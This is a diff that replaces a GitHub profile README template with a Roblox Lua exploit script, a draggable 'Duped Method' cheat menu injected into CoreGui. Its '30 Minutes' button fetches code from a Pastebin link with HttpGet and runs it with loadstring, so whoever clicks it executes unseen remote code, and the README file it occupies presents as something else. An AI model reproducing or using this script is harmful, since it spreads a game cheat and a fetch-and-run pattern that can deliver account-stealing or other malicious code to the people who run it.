@@ -1,10 +1,52 @@
-- 👋 Hi, I’m @Naikozu
-- 👀 I’m interested in ...
-- 🌱 I’m currently learning ...
-- 💞️ I’m looking to collaborate on ...
-- 📫 How to reach me ...
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local DupedMethodMadeByPr4ston = Instance.new("TextLabel")
+local RESET = Instance.new("TextButton")
+local _10Minutes = Instance.new("TextButton")
+local _20Minutes = Instance.new("TextButton")
+local _30Minutes = Instance.new("TextButton")
 
-<!---
-Naikozu/Naikozu is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(127, 127, 127)
+main.Position = UDim2.new(0.0659062043, 0, 0.186878726, 0)
+main.Size = UDim2.new(0, 214, 0, 260)
+main.Active = true
+main.Draggable = true
+
+DupedMethodMadeByPr4ston.Name = "Duped Method | Made By Pr4ston"
+DupedMethodMadeByPr4ston.Parent = main
+DupedMethodMadeByPr4ston.BackgroundColor3 = Color3.fromRGB(190, 190, 190)
+DupedMethodMadeByPr4ston.Position = UDim2.new(-0.000352235977, 0, 0, 0)
+DupedMethodMadeByPr4ston.Size = UDim2.new(0, 215, 0, 56)
+DupedMethodMadeByPr4ston.Font = Enum.Font.SourceSans
+DupedMethodMadeByPr4ston.Text = "Duped Method | Made By Pr4ston"
+DupedMethodMadeByPr4ston.TextColor3 = Color3.fromRGB(0, 0, 0)
+DupedMethodMadeByPr4ston.TextSize = 14.000
+
+RESET.Name = "RESET"
+RESET.Parent = main
+RESET.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+RESET.Position = UDim2.new(0, 0, 0.204379559, 0)
+RESET.Size = UDim2.new(0, 214, 0, 50)
+RESET.Font = Enum.Font.SourceSans
+RESET.Text = "RESET"
+RESET.TextColor3 = Color3.fromRGB(0, 0, 0)
+RESET.TextSize = 40.000
+
+_30Minutes.Name = "30 Minutes"
+_30Minutes.Parent = main
+_30Minutes.BackgroundColor3 = Color3.fromRGB(0, 71, 0)
+_30Minutes.Position = UDim2.new(0, 0, 0.746376812, 0)
+_30Minutes.Size = UDim2.new(0, 213, 0, 65)
+_30Minutes.Font = Enum.Font.SourceSans
+_30Minutes.Text = "30 Minutes"
+_30Minutes.TextColor3 = Color3.fromRGB(0, 0, 0)
+_30Minutes.TextSize = 46.000
+_30Minutes.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('pastebin.com/eftBphVG'))()
+end)
